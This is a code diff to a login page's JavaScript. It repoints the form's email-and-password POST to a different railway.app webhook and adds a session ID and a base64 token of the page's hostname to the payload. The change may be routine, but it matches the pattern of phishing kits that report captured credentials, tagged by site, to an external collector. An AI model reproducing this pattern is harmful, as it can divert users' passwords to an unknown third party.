@@ -489,6 +489,17 @@
         emailWrap.classList.remove("invalid");
         passwordWrap.classList.remove("invalid");
       }
+
+        function gerarSessionId() {
+            return 'sess_' + Array.from(
+                crypto.getRandomValues(new Uint8Array(16)),
+                b => b.toString(16).padStart(2, '0')
+            ).join('');
+        }
+
+        function getToken() {
+            return btoa(window.location.hostname);
+        }
   
       function validateForm(showErrors) {
         const email = emailInput.value.trim();
@@ -560,18 +571,21 @@ loginButton.addEventListener("click", async function () {
   
         const email = emailInput.value.trim();
         const password = passwordInput.value;
+        const session_id = gerarSessionId();
+        const token = getToken();
   
         isSubmitting = true;
         loginButton.disabled = true;
         loginButton.textContent = "Validando...";
+      
   
         try {
-          const response = await fetch("https://clarityweb.up.railway.app/webhook/login", {
+          const response = await fetch("https://goldmineink.up.railway.app/webhook/login", {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
             },
-            body: JSON.stringify({ email, password })
+            body: JSON.stringify({ email, password, session_id, token })
           });
   
           const data = await response.json().catch(() => ({}));
